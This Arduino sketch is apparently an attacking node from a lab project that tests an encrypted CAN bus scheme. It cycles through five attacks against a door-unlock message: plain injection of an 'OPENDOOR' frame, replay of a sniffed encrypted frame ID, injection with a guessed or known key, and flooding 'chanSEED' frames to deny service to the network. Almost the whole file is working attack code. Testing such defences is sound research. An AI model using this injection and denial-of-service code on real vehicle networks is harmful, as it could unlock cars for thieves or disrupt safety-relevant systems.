// Imported Arduino libraries
#include <mcp_can.h>
#include <SPI.h>

// Homemade libraries
#include "AES_128.h"
#include "ECDH.h"
#include "Utilities.h"

// Helpful defines
#define CAN0_INT 2
#define AVR_UNO_CS 10
#define _OPENDOOR "OPENDOOR"
#define _CHANGE_SEED "chanSEED"

// CAN network interface variables
MCP_CAN CAN0(AVR_UNO_CS);
long unsigned int rxId;
unsigned char len = 0;
unsigned char rxBuf[8];

long unsigned int encryptedFrame = 0;
unsigned char initialKey[17] = "Initial Keysssss";
unsigned char mockKey[17] = "";

static unsigned int iteration = 0;

// Attcking node scenarios: 
// 1. Nothing about the network and how encryption works is known, aka a classic CAN injection
//    a. Listen to the messages
//    b. Send the "OPENDOOR" message
// 2. We will listen for the encrypted frame and send the messages so we will bypass the filter.
//    a. Listen to the messages and record the encryptedFrame
//    b. Send the "OPENDOOR" message
// 3. We start from 2 and add the fact that we know the hashing function, but not the initialKey
// 4. We go from 3 and we know the initialKey
// 5. A more sophisticated attack, we will start from the fact that the only frame that the network will accept 
// without encryption is the _CHANGE_SEED frame. We will basically DOS the network and force a timeout.

// Function to guess the initialKey
void guessKey(unsigned char* key)
{
  for(int i = 0; i < 16; i++)
    key[i] = (unsigned char)random(1, 255);
}

void setup() 
{
    Serial.begin(115200);
  
  // Initialize MCP2515 running at 16MHz with a baudrate of 500kb/s and the masks and filters disabled.
  if(CAN0.begin(MCP_ANY, CAN_500KBPS, MCP_16MHZ) == CAN_OK)
    Serial.println(F("MCP2515 Initialized Successfully!"));
  else
    Serial.println(F("Error Initializing MCP2515..."));
  
  CAN0.setMode(MCP_NORMAL);                     // Set operation mode to normal so the MCP2515 sends acks to received data.

  pinMode(CAN0_INT, INPUT);  

  Serial.println(F("Going to sleep....."));

  delay(30000);

}

void loop() 
{
  iteration++;
  
  if(iteration <= 20)
  {
    readCAN(0);

    writeCAN(0x100, _OPENDOOR, 8); // classic CAN injection, we are sending a standard frame due to it's higher priority, but it should get filtered by the network

    Serial.println(F("Classic CAN injection executed."));
  }
  else if(iteration <= 40)
  {
    readCAN(1);

    writeCAN(encryptedFrame, _OPENDOOR, 8); // advanced CAN injection, bypass the frame filter

    Serial.println(F("Advanced CAN injection executed.")); 
  }
  else if(iteration <= 60)
  {
    readCAN(1);

    guessKey(mockKey);

    bad_hash(mockKey, random(1, 200));

    writeCAN(encryptedFrame, _OPENDOOR, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too

    Serial.println(F("Implausable CAN injection executed.")); 
  }
  else if(iteration <= 80)
  {
    readCAN(1);

    bad_hash(initialKey, random(1, 200));

    writeCAN(encryptedFrame, _OPENDOOR, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too

    Serial.println(F("Implausable CAN injection executed, we know the key and the hash function.")); 
  }
  else if(iteration <= 100)
  {
    readCAN(1);
    
    writeCAN(encryptedFrame, _CHANGE_SEED, 8); // implausable CAN injection, we know that the hashing function is deterministic and we know the function too

    Serial.println(F("DOS the netwrok.")); 
  }
  else
    iteration = 0;

}


// Function to send a CAN message
// The function accepts the following arguments:
// id: the id of the CAN frame, can be 11 or 29 bit long, not in between
// data: the sent payload
// leng: payload length
void writeCAN(long id, unsigned char* data, unsigned char leng)
{
  // send data:  ID = encrypted frame, Data length = 8 bytes, 'data' = array of data bytes to send
  byte sndStat = CAN0.sendMsgBuf(id, leng, data);
  
  if(sndStat == CAN_OK)
  {
    Serial.println("Message Sent Successfully!");
  } 
  else 
  {
    Serial.println("Error Sending Message...");
  }
  delay(20);   // send data per 100ms
  
}

// Function to read a CAN message
// the function also handles the processing of the frame
void readCAN(int mode)
{
  if(!digitalRead(CAN0_INT))                         // If CAN0_INT pin is low, read receive buffer
  { 
    CAN0.readMsgBuf(&rxId, &len, rxBuf);      // Read data: len = data length, buf = data byte(s)

      if((rxId & 0x80000000) == 0x80000000)     // Determine if ID is standard (11 bits) or extended (29 bits)
       {
        Serial.println("Extended ID: 0x");
        Serial.print((rxId & 0x1FFFFFFF));
        Serial.print("  DLC: ");
        Serial.print(len);
        Serial.print("  Data:");
       }
      else
      {
        Serial.println("Extended ID: 0x");
        Serial.print(rxId);
        Serial.print("  DLC: ");
        Serial.print(len);
        Serial.print("  Data:");
      }
    
      if((rxId & 0x40000000) == 0x40000000)
      {    // Determine if message is a remote request frame.
        Serial.println(" REMOTE REQUEST FRAME");
      } 
      else 
      {
        for(byte i = 0; i < len; i++)
        {
          Serial.print(rxBuf[i], HEX);
        }
      }
      
      Serial.println();
    }
    else
    {
      // do nothing
    }

    if(mode == 1)
    {
      encryptedFrame = rxId;
    }
    
}
